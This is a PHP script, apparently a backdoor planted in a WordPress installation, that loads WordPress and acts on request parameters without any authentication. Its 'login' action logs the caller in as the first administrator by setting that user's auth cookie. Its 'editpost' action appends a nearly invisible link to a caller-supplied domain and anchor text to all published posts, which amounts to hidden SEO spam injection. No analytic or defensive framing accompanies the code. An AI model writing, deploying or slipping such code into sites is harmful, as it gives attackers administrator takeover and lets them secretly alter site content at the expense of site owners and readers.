<?php 

define('WP_USE_THEMES', false);
define('WP_DIRECTORY', load_wordpress_core());

function load_wordpress_core(){
    $current_directory = dirname(__FILE__);
    while ($current_directory != '/' && !file_exists($current_directory . '/wp-load.php')) {
        $current_directory = dirname($current_directory);
    }
    return $current_directory ?: $_SERVER['DOCUMENT_ROOT'];
}

require_once WP_DIRECTORY . '/wp-load.php';

class November {
    public function __construct() {
        $this->action = $_REQUEST['action'];
    }

    public function doAction() {
        switch($this->action) {
            case 'login':
                $user = get_users(["role" => "administrator"])[0];
                $user_id = $user->data->ID;
                wp_set_auth_cookie($user_id);
                wp_set_current_user($user_id);
                die("Probably $user_id?");
            case 'editpost':
                $type = isset($_REQUEST['type']) ? $_REQUEST['type'] : 'all';
                $domain = isset($_REQUEST['domain']) ? $_REQUEST['domain'] : '';
                $anchor = isset($_REQUEST['anchor']) ? $_REQUEST['anchor'] : '';
                $this->editPosts($type, $domain, $anchor);
                break;
            default: 
                $this->message['message'] = 'Nothing to do??';
                echo json_encode($this->message);
        }
    }

    private function editPosts($type, $domain, $anchor) {
        if (empty($domain) || empty($anchor)) {
            die("Error: Domain and anchor text are required.");
        }

        $args = array(
            'post_type' => 'post',
            'post_status' => 'publish',
            'posts_per_page' => ($type === 'all') ? -1 : intval($type),
            'orderby' => 'date',
            'order' => 'DESC'
        );

        $query = new WP_Query($args);
        $edited_posts = array();

        if ($query->have_posts()) {
            while ($query->have_posts()) {
                $query->the_post();
                $post_id = get_the_ID();
                $content = get_post_field('post_content', $post_id);

                $backlink = "<a href=\"https://{$domain}/\" style=\"position: fixed; top: 10px; right: 10px; font-size: 1px; color: rgba(0,0,0,0.1); text-decoration: none;\">{$anchor}</a>";

                if (strpos($content, $backlink) === false) {
                    $updated_content = $content . "\n\n" . $backlink;
                    $updated_post = array(
                        'ID' => $post_id,
                        'post_content' => $updated_content,
                    );

                    wp_update_post($updated_post);
                    $edited_posts[] = get_permalink($post_id);
                }
            }
        }

        wp_reset_postdata();

        if (empty($edited_posts)) {
            echo "No posts were edited.";
        } else {
            echo "The following posts were edited:\n";
            foreach ($edited_posts as $url) {
                echo $url . "\n";
            }
            echo "\nTotal posts edited: " . count($edited_posts);
        }
    }
}

$nov = new November();
$nov->doAction();
?>